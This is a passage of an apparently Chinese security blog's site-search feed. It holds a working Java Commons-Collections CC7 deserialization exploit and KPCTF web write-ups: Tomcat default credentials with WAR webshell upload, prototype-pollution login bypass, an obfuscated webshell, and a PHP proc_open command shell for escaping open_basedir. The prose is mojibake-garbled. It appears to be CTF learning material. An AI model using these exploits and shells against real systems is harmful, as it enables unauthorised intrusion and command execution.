iMethodName=transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        iMethodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iMethodName.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        <span class="comment">//tiedMapEntry.toString();</span></span><br><span class="line">        Serializ(obj);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7ä¹Ÿä¸€æ ·æ˜¯æ¢äº†ä¸€ç§æ–¹å¼æ¥è§¦å‘LazyMapçš„CCé“¾å­<br>EXPå¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class clazz=tmpl.getClass();</span><br><span class="line">        Field namefeld= clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefeld.set(tmpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Field bytefeld= clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytefeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\24882\\Desktop\\java-sec\\cc\\src\\test\\java\\test_calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes= &#123;code&#125;;</span><br><span class="line">        bytefeld.set(tmpl,bytecodes);</span><br><span class="line">        Field tfactoryfeld= clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfeld.set(tmpl,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tmpl&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">2</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap1.put(<span class="string">&quot;pP&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;oo&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;pP&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz2</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz2.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,Transformer);</span><br><span class="line"></span><br><span class="line">        Serializ(hashtable);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><img src="/2024/09/25/CC%E9%93%BE/CC.png" class="" title="alt text">]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KPCTF-åˆèµ›wp</title>
      <link href="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/"/>
      <url>/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="Sign-1n"><a href="#Sign-1n" class="headerlink" title="Sign_1n"></a>Sign_1n</h1><p>ç­¾åˆ°é¢˜æ‰“å¼€å‘ç°ä¸ºApache Tomcat/8.0.43åœ¨ç½‘ä¸Šæœç´¢ä¼šå‘ç°è¯¥ç‰ˆæœ¬å­˜åœ¨åå°å¼±å£ä»¤+æ–‡ä»¶ä¸Šä¼ getshell<br>è®¿é—®/manager/htmlè·¯ç”±tomcat/tomcatç™»é™†<br>ç™»é™†åå°ä¼šå‘ç°å…¶å­˜åœ¨waråŒ…ä¸Šä¼ <br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/2.png" class="" title="alt text"><br>å†™ä¸€ä¸ªèšå‰‘çš„shell.jspå‹ç¼©å,åç¼€æ”¹ä¸ºwarä¸Šä¼ ååœ¨èšå‰‘è¿æ¥<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/5.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/3.png" class="" title="alt text"><br>åœ¨æ ¹ç›®å½•å‘ç°flag</p><h1 id="How-to-get-the-flag"><a href="#How-to-get-the-flag" class="headerlink" title="How to get the flag"></a>How to get the flag</h1><p>æ‰“å¼€åæŸ¥çœ‹index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// flag in flag.php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9\/.]+$/&#x27;</span>, <span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\.\.)|(\.\/)/&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/tmp/&#x27;</span>.<span class="variable">$file</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¼šå‘ç°å­˜åœ¨æ–‡ä»¶åŒ…å«å¹¶ä¸”åªèƒ½è¯»å–/tmpæ–‡ä»¶ä¸‹çš„å†…å®¹<br>æ‰«æåå°å‘ç°å­˜åœ¨flag.phpå’Œphpinfo.php<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/7.png" class="" title="alt text"><br>ä»”ç»†æŸ¥çœ‹ä¼šå‘ç°å…¶æ‰“å¼€äº†Opcache<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/8.png" class="" title="alt text"><br>æˆ‘ä»¬æŸ¥ä¸€ä¸‹ä¼šå‘ç°Opcacheä¼šå°†è®¿é—®è¿‡çš„phpæ–‡ä»¶è¿›è¡Œç¼“å­˜,è¯¥é¢˜çš„å­˜å‚¨ä½ç½®ä¸º/tmp<br>å­˜å‚¨çš„ç»“æ„ä¸º/tmp/system_id/var/www/html/xxx.php.bin<br>æ—¢ç„¶æˆ‘ä»¬è¦è¯»å–flag.phpçš„å†…å®¹é‚£ä¹ˆæˆ‘ä»¬è¯»å–å…¶ç¼“å­˜æ–‡ä»¶å³å¯ã€‚é‚£ä¹ˆæˆ‘ä»¬çš„é—®é¢˜å°±å˜æˆäº†æ€ä¹ˆå¾—åˆ°è¿™system_id<br>åœ¨php8ç‰ˆæœ¬system_idä¸è¿™å‡ ä¸ªå‚æ•°æœ‰å…‰<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP ç‰ˆæœ¬å·</span><br><span class="line">Zend Extension</span><br><span class="line">å¦‚æœæ˜¯devç‰ˆæœ¬çš„è¿˜ä¸ç¼–è¯‘æ—¶é—´æœ‰å…³</span><br></pre></td></tr></table></figure><br>è¯¥é¢˜çš„ç‰ˆæœ¬æ˜¯8.0.30æˆ‘ä»¬ä¸‹è½½æºç ä¼šå‘ç°å…¶æºç çš„Zend Extensionå’Œé¢˜ç›®çš„Zend Extension    æ˜¯ä¸€æ ·çš„<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/9.png" class="" title="alt text"><br>å³æˆ‘ä»¬ç›´æ¥åœ¨æœ¬åœ°çš„liunxç¼–è¯‘è¿™ä¸ªç‰ˆæœ¬çš„phpå¹¶æ‰“å¼€php.iniä¸­çš„Opcache<br>å¼€å¯phpæœåŠ¡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>è®¿é—®index.php<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/10.png" class="" title="alt text"><br>å¯ä»¥å‘ç°system_id<br>è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†system_id<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/11.png" class="" title="alt text"><br>è¯»å–flag.php.binæ–‡ä»¶</p><h1 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass_it"></a>Bypass_it</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/12.png" class="" title="alt text"><p>æŸ¥çœ‹æºç æˆ‘ä»¬ä¼šå‘ç°å…¶æ˜æ˜¾å­˜åœ¨ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ã€‚<br>æˆ‘ä»¬å¯»æ‰¾mergeå‡½æ•°ä¼šå‘ç°åœ¨ç™»é™†å‰ä½¿ç”¨äº†è¿™ä¸ªå‡½æ•°<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/13.png" class="" title="alt text"><br>è€Œä¸‹é¢çš„<code>/Access_Key_id</code>è·¯ç”±çš„ç™»é™†åˆ¤æ–­ä¸ºcookieä¸­çš„userçš„å€¼ä¸ºSECRET<em>COOKIE,æˆ–è€…req.userä¸ºadminï¼Œå› ä¸ºreq.userçš„å€¼æ˜¯ä¸å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ±¡æŸ“å…¶åŸå‹çš„userä¸ºadminä»¥æ­¤æ¥ç»•è¿‡ç™»é™†éªŒè¯<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/14.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶æ±¡æŸ“ä½ç½®è¿‡æ»¤äº†`<em>_proto</em></em><code>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨</code>{â€œconstructorâ€:{â€œprototypeâ€:{}}}`æ¥ç»•è¿‡</p><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/20.png" class="" title="alt text"><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/21.png" class="" title="alt text"><p>å¾—åˆ°flag1<br>æˆ‘ä»¬ç»§ç»­æŸ¥çœ‹ä»£ç ä¼šå‘ç°<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Secret_Access_KeyController</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> checkcode = req.<span class="property">body</span>.<span class="property">checkcode</span> ? req.<span class="property">body</span>.<span class="property">checkcode</span> : <span class="number">1234</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">    <span class="keyword">if</span> (checkcode.<span class="property">length</span> === <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            checkcode = checkcode.<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">if</span> (checkcode !== <span class="string">&quot;aGr5AtSp55dRacer&quot;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid Checkcode1:&quot;</span> + checkcode &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (__) &#123; &#125;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;You Got Secret_Access_Key: &quot;</span> + <span class="title class_">Secret</span>_Access_Key.<span class="title function_">toString</span>().<span class="title function_">trim</span>() &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">json</span>(&#123; <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;Invalid Checkcode2:&quot;</span> + checkcode &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥å‘ç°catch å¤„ä¼šæŠ›å‡ºSKçš„å€¼å³flag2ã€‚é‚£ä¹ˆæˆ‘ä»¬åªæœ‰è®©å…¶åœ¨checkcode = checkcode.toLowerCase()å¤„æŠ¥é”™å³å¯ï¼Œæˆ‘ä»¬ç›´æ¥ä»¤checkcodeä¸ºæ•°ç»„å¹¶æœ‰16ä¸ªå…ƒç´ å³å¯<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/22.png" class="" title="alt text"></p><p>å¾—åˆ°flag2</p><h1 id="Whatâ€™s-this"><a href="#Whatâ€™s-this" class="headerlink" title="Whatâ€™s_this"></a>Whatâ€™s_this</h1><p>æ‰“å¼€åæ‰«ç›®å½•ä¼šå‘ç°webshell.phpä»£ç å¦‚ä¸‹<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/23.png" class="" title="alt text"><br>å› ä¸ºå¤ªé•¿äº†æ‰€ä»¥æˆ‘ç›´æ¥æˆªå›¾äº†å¦‚æœå¤åˆ¶çš„è¯è½¬pdfä¼šå¾ˆéš¾çœ‹<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/16.png" class="" title="alt text"><br>æˆ‘ä»¬ç›´æ¥è¾“å‡ºå˜é‡ï¼Œå¹¶å°†evalåªèƒ½çš„å‚æ•°å†…å®¹echoå‡ºæ¥<br>ä¼šå‘ç°å…¶å¥—äº†å¨ƒï¼Œæˆ‘ä»¬ç»§ç»­è¾“å‡ºevalè¿è¡Œçš„å‚æ•°<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/17.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/18.png" class="" title="alt text"><br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/19.png" class="" title="alt text"><br>å°±è¿™æ ·é‡å¤çš„è¾“å‡ºevalçš„å‚æ•°ä¼šå¾—åˆ°æœ€åçš„shellçš„å†…å®¹æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å‚æ•°ä¸ºq<br>ç›´æ¥å‘½ä»¤æ‰§è¡Œ<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/24.png" class="" title="alt text"></p><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><p>ä½¿ç”¨breakpoint()å‡½æ•°åå³å¯éšä¾¿æ‰§è¡Œå‘½ä»¤<br><img src="/2024/09/20/KPCTF-%E5%88%9D%E8%B5%9Bwp/26.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§å§¿åŠ¿</title>
      <link href="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/"/>
      <url>/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="web805-open-basedir"><a href="#web805-open-basedir" class="headerlink" title="web805_open_basedir"></a>web805_open_basedir</h1><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯å¦‚ä½•ç»•è¿‡open_basedirã€‚open_basediræ˜¯phpçš„ä¸€ä¸ªé—²ç€ç›®å½•çš„iniè®¾ç½®ï¼Œä½†æ˜¯è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒå¥½é€ƒé€¸çš„<br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/1.png" class="" title="alt text"><br>é¦–å…ˆæˆ‘ä»¬å¯ä»¥å‘ç°å…¶æ— æ³•ä½¿ç”¨å¸¸è§çš„æ–‡ä»¶è¯»å–å‡½æ•°æ¥è¯»å–open_basedirå¤–çš„æ–‡ä»¶ã€‚<br>ä½†æ˜¯æˆ‘ä»¬æœ‰å¦‚ä¸‹å‡ ç§æ–¹å¼æ¥ç»•è¿‡</p><h2 id="1-open-basedirå¯¹å‘½ä»¤æ‰§è¡Œå¹¶æ²¡æœ‰é™åˆ¶"><a href="#1-open-basedirå¯¹å‘½ä»¤æ‰§è¡Œå¹¶æ²¡æœ‰é™åˆ¶" class="headerlink" title="1.open_basedirå¯¹å‘½ä»¤æ‰§è¡Œå¹¶æ²¡æœ‰é™åˆ¶"></a>1.open_basedirå¯¹å‘½ä»¤æ‰§è¡Œå¹¶æ²¡æœ‰é™åˆ¶</h2><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/2.png" class="" title="alt text"><p>æˆ‘ä»¬å¯ä»¥å…ˆå°è¯•ç»•è¿‡disable_functionsã€‚æˆ‘å°è¯•ä½¿ç”¨èšå‰‘çš„æ’ä»¶æ¥è¿›è¡Œç»•è¿‡ä½†æ˜¯æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆèšæ— æ³•è¿æ¥ä¸Šè¿™ä¸ªã€‚æ‰€ä»¥æˆ‘åªå¥½æ‰‹åŠ¨ç»•è¿‡<br>é¦–å…ˆæˆ‘å‘ç°å…¶æ²¡æœ‰è¿‡æ»¤proc_openè¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥å‘½ä»¤æ‰§è¡Œ<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$descriptorspec</span>=<span class="keyword">array</span>( </span><br><span class="line">       <span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;r&#x27;</span>), </span><br><span class="line">       <span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),</span><br><span class="line">       <span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">   );</span><br><span class="line">   <span class="variable">$handle</span>=<span class="title function_ invoke__">proc_open</span>(<span class="variable">$command</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>,<span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$handle</span>))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&#x27;proc_open failed&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">     <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span>(<span class="variable">$s</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">     <span class="title function_ invoke__">print_r</span>(<span class="variable">$s</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line">   <span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">   <span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure><br><img src="/2024/09/18/%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/3.png" class="" title="alt text"></p><h2 id="2-ä½¿ç”¨glob-ç›®å½•è¯»å–-åˆ©ç”¨chdir-ä¸ini-set-ç»„åˆBypass"><a href="#2-ä½¿ç”¨glob-ç›®å½•è¯»å–-åˆ©ç”¨chdir-ä¸ini-set-ç»„åˆBypass" class="headerlink" 